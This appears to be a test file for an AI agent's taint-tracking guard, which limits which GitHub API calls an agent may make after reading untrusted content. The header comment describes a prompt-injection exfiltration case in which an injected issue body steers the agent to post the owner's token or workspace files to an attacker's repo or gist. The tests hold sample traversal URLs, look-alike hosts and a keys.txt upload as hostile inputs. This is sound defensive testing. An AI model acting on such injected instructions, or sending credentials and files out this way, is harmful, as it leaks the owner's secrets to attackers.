/* node test/taint-api-continuation-scope.test.js — A SAME-ORIGIN API CONTINUATION IS ONE METHOD UNDER ONE FOLDER, AND NEVER
   CARRIES FILES (GHSA-2hpj-9wm7-rvg5 #6).

   The 10-12 continuation let a run that read one HTTPS API's response keep calling THAT origin with keys it already sent
   there, with no card and even unattended. On a multi-tenant API one origin is not one principal: an injected GitHub issue
   body can direct a POST to the attacker's own repo or a gist on the same host, with the Commander's key, and a
   ${file:…} reference or a multipart part makes the HOST read a workspace file the model never saw and upload it. Locks:
     - the scope keeps the first API read's method and path folder (chosen before any untrusted byte arrived), and a
       continuation must match both; an encoded slash/dot/backslash path is never comparable;
     - a request that attaches files is never a continuation, and Full Access does not send it unasked: a watched run
       confirms that one call, an unattended run is refused;
     - an untainted run, and a tainted run's ordinary reads under the folder, are unchanged;
     - the lockout names the refused upload and what still goes through. */
'use strict';
const { readSidecarSource } = require('./helpers/source');
const A = require('./_assert.js');
const taint = require('../sidecar/taint.js');

const wr = { name: 'web_request', capability: 'web', scope: 'write', impact: 'external-credentialed' };
const call = (url, extra) => ({ name: 'web_request', args: Object.assign({ url }, extra || {}) });
const KEY = { headers: { Authorization: 'Bearer $' + '{GITHUB_TOKEN}' } };
const GH = 'https://api.github.com';
const FILE = (p) => '$' + '{file:' + p + '}';
const first = (url, extra) => taint.scopeAfterSource(null, wr, call(url, Object.assign({}, KEY, extra || {})), { wasTainted: false, runId: 'r1', responseOrigin: GH });
const cont = (scope, url, extra) => taint.sameOriginContinuation(scope, wr, call(url, Object.assign({}, KEY, extra || {})));

// ---- the scope remembers the first read's method and folder ----
{
  const s = first(GH + '/repos/victim/project/issues/5');
  A.eq(s, { origin: GH, keys: ['GITHUB_TOKEN'], method: 'GET', prefix: '/repos/victim/project/issues/' }, 'the first read scopes origin, key, method and folder');
  A.eq(first(GH + '/repos/victim/project/issues').prefix, '/repos/victim/project/', 'a collection path scopes its parent folder');
  A.eq(first(GH + '/').prefix, '/', 'the root path scopes the whole origin');
  A.eq(first(GH + '/graphql', { method: 'post', body: '{}' }).method, 'POST', 'the method is compared upper-case');
  A.ok(first(GH + '/repos/victim/project/issues/..%2F..%2F..%2Fattacker').broad, 'an encoded slash in the first read cannot be scoped');
  A.ok(first(GH + '/repos/victim/%2E%2E%5Cother').broad, 'nor an encoded dot or backslash');
  A.ok(taint.scopeAfterSource(null, wr, call(GH + '/x', KEY), { wasTainted: true, responseOrigin: GH }).broad, 'a run tainted before its first API read stays broad');
}

// ---- the multi-tenant exfiltration the advisory describes ----
{
  const s = first(GH + '/repos/victim/project/issues/5');
  A.ok(cont(s, GH + '/repos/victim/project/issues/6'), 'another issue of the same repo, by GET, still continues');
  A.ok(cont(s, GH + '/repos/victim/project/issues/5/comments?per_page=100'), 'and its comments (a query string does not matter)');
  A.ok(!cont(s, GH + '/repos/victim/project/issues/5/comments', { method: 'POST', body: '{"body":"secrets"}' }), 'a POST of a comment is another method: it asks');
  A.ok(!cont(s, GH + '/gists', { method: 'POST', body: '{"files":{}}' }), 'a gist is outside the folder');
  A.ok(!cont(s, GH + '/repos/attacker/loot/issues'), 'another account\'s repo is outside the folder, even by GET');
  A.ok(!cont(s, GH + '/repos/attacker/loot/contents/x', { method: 'PUT', body: '{"content":"' + FILE('notes/keys.txt') + '"}' }), 'an upload to another repo is refused on every count');
  A.ok(!cont(s, GH + '/repos/victim/project/issues/..%2F..%2F..%2Fattacker/loot'), 'an encoded traversal never matches the folder');
  A.ok(!cont(s, GH + '/repos/victim/project/issues/%2e%2e/%2e%2e/%2e%2e/attacker/loot'), 'a dot-dot the URL parser resolves leaves the folder');
  A.ok(!cont(s, GH + '/repos/victim/project/issues-evil/1'), 'a sibling that only shares a prefix string is not inside the folder');
  A.ok(!cont(s, 'https://api.github.com.evil.example/repos/victim/project/issues/6'), 'a look-alike host never continues');
  A.ok(!cont(s, GH + '/repos/victim/project/issues/6', { headers: { Authorization: 'Bearer $' + '{OTHER_TOKEN}' } }), 'a key the run never sent there keeps the lock');
  A.ok(!taint.sameOriginContinuation(s, wr, call(GH + '/repos/victim/project/issues/6', KEY), { untrustedEntry: true }), 'an untrusted entry never continues');
  // a scope made before this lane (no method/folder) never continues: fail closed, not "any path"
  A.ok(!taint.sameOriginContinuation({ origin: GH, keys: ['GITHUB_TOKEN'] }, wr, call(GH + '/repos/victim/project/issues/6', KEY)), 'a scope without method and folder never continues');
}

// ---- a write job keeps its own method and folder; files never ride along ----
{
  const s = first(GH + '/graphql', { method: 'POST', body: '{"query":"{ viewer { login } }"}' });
  A.ok(cont(s, GH + '/graphql', { method: 'POST', body: '{"query":"{ repository(owner:\\"victim\\",name:\\"project\\"){ id } }"}' }), 'a POST to the same endpoint continues (one-endpoint APIs)');
  A.ok(!cont(s, GH + '/graphql', { method: 'GET' }), 'another method asks');
  A.ok(!cont(s, GH + '/graphql', { method: 'POST', body: '{"q":"' + FILE('report.pdf') + '"}' }), 'a ${file:} reference in the body is never a continuation');
  A.ok(!cont(s, GH + '/graphql', { method: 'POST', multipart: [{ name: 'f', file: 'report.pdf' }] }), 'nor a multipart part with a file');
  A.ok(!cont(s, GH + '/graphql', { method: 'POST', multipart: [{ name: 'title', value: 'x' }] }), 'nor any multipart body (one rule)');
  A.eq([taint.requestCarriesFiles(call(GH, { body: '{"a":1}' })), taint.requestCarriesFiles(call(GH, { body: 'x ' + FILE('a.png') })),
    taint.requestCarriesFiles(call(GH, { multipart: [] })), taint.requestCarriesFiles(call(GH, { multipart: 'not-an-array' })), taint.requestCarriesFiles(call(GH))],
  [false, true, true, false, false], 'requestCarriesFiles reads the body reference and any multipart array (web.js ignores a non-array)');
}

// ---- the post-taint boundary: an upload asks even under Full Access; untainted use is unchanged ----
{
  const upload = call(GH + '/repos/me/site/contents/a.png', { method: 'PUT', body: '{"content":"' + FILE('a.png') + '"}' });
  const plain = call(GH + '/repos/me/site/issues', { method: 'POST', body: '{"title":"t"}' });
  const B = (c, o) => taint.postTaintBoundary(wr, Object.assign({ taintedBy: 'web_request', call: c }, o));
  A.eq(B(upload, { fullAccess: true, surface: 'autonomous', hasPrompt: false }), { allow: false, needsConfirmation: false, oneShot: false }, 'an unattended Full Access run does not send a file after taint');
  A.eq(B(upload, { fullAccess: true, surface: 'interactive', hasPrompt: true }), { allow: false, needsConfirmation: true, oneShot: false }, 'a watched Full Access run asks for that one upload');
  A.eq(B(upload, { fullAccess: true, surface: 'interactive', hasPrompt: true, decision: 'always' }), { allow: true, needsConfirmation: false, oneShot: true }, 'a yes sends that one call (always collapses to once)');
  A.eq(B(upload, { surface: 'interactive', hasPrompt: true, decision: 'deny' }).allow, false, 'a no is refused');
  A.eq(B(plain, { fullAccess: true, surface: 'autonomous', hasPrompt: false }).allow, true, 'a request without files keeps the owner\'s Full Access posture, as before');
  A.eq(B(plain, { fullAccess: true, untrustedEntry: true, surface: 'autonomous', hasPrompt: false }).allow, false, 'and an untrusted entry still overrides it');
  A.eq(taint.postTaintBoundary(wr, { taintedBy: null, call: upload, surface: 'autonomous' }), { allow: true, needsConfirmation: false, oneShot: false }, 'an UNTAINTED run uploads exactly as before');
}

// ---- the words: the lockout names the upload and what still goes through ----
{
  const s = first(GH + '/repos/victim/project/issues/5');
  const lead = taint.lockoutLead(wr, call(GH + '/x', { method: 'POST', multipart: [{ name: 'f', file: 'a.png' }] }));
  A.ok(/^This "web_request" call attaches workspace files/.test(lead) && /fresh confirmation\.$/.test(lead), 'an upload lockout says it is the files that are refused: ' + lead);
  A.eq(taint.lockoutLead(wr, call(GH + '/x')), '"web_request" is no longer available on this run.', 'any other lockout keeps its words');
  A.eq(taint.continuationHint(s), 'Calls that still go through on this run without a confirmation: GET requests under https://api.github.com/repos/victim/project/issues/ with the keys already sent there and no attached files.', 'the hint names method, folder, keys and files');
  A.eq([taint.continuationHint({ broad: true }), taint.continuationHint(null)], ['', ''], 'no hint without a narrow scope');
}

// ---- wiring: both boundary calls hand the policy the call; the lockout carries the hint for an API run's own taint ----
{
  const idx = readSidecarSource();
  const calls = idx.match(/revokedByTaint\.boundary\(liveTool, \{[\s\S]{0,400}?call: c\s*\}\)/g) || [];
  A.eq(calls.length, 2, 'the first ask and the answered decision both pass call: c (the upload rule reads it)');
  A.ok(/const apiStillOpen = \(!inheritedTaint && !untrustedEntryRun && String\(c\.name \|\| ''\)\.replace\(\/\\\.\/g, '_'\) === 'web_request'\)\s*\? taintPolicy\.continuationHint\(taintScope\) : '';/.test(idx), 'the lockout asks for the hint only for an API run\'s own taint');
  A.ok(/content: 'BLOCKED: ' \+ taintPolicy\.lockoutLead\(liveTool, c\) \+ ' ' \+ taintCause \+ ' ' \+ \(apiStillOpen \? apiStillOpen \+ ' ' : ''\)/.test(idx), 'and puts it right after the cause');
}

A.report('taint-api-continuation-scope.test');
